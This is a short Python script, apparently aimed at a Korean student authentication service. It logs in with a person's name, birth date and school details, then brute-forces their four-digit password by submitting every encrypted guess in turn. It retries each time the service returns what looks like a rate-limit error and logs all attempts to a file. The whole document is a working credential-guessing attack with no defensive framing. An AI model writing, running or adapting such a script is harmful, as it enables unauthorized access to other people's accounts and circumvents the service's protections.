
import asyncio
from login import login
from validate_password import encrypt_password
from validate_password import validate_password

def block():

    name = str(input('Name: '))
    birth = str(input('Birth: '))
    area = str(input('Area: '))
    school_name = str(input('School Name: '))
    school_level = str(input('School Level: '))

    with open('info', 'w') as f:
        f.write(f'{name}\n')
        f.write(f'{birth}\n')
        f.write(f'{area}\n')
        f.write(f'{school_name}\n')
        f.write(f'{school_level}\n')

        
        
    # 학생 인증 토큰을 token에 저장
    token = login(
        area, school_name, school_level, birth, name
    )['token']
    not_pw = [0000, 1111, 2222, 3333, 4444, 5555, 6666, 7777, 8888, 9999]


    for password in range(1000, 10000):
        if password in not_pw:
            continue
        with open('try', 'a') as f:
            f.write(f'{password}\n')

        data = asyncio.get_event_loop().run_until_complete(encrypt_password(str(password)))
        a = validate_password(token, data)

        while a['errorCode'] == 1000:
            a = validate_password(token, data)
            print(f'\r{password}, {a}', end='')


        print(f'\r{password}, {a}', end='')

    for password in range(0000, 999):
        if password in not_pw:
            continue
        with open('try', 'a') as f:
            f.write(f'{password}\n')
            
        data = asyncio.get_event_loop().run_until_complete(encrypt_password(str(password)))
        a = validate_password(token, data)

        while a['errorCode'] == 1000:
            a = validate_password(token, data)

        
        if 'data' not in a.keys():
                print(f'\n[!]Error: { a }')
                return
        print(a)
        print(f'\r{password}', end='')

block()
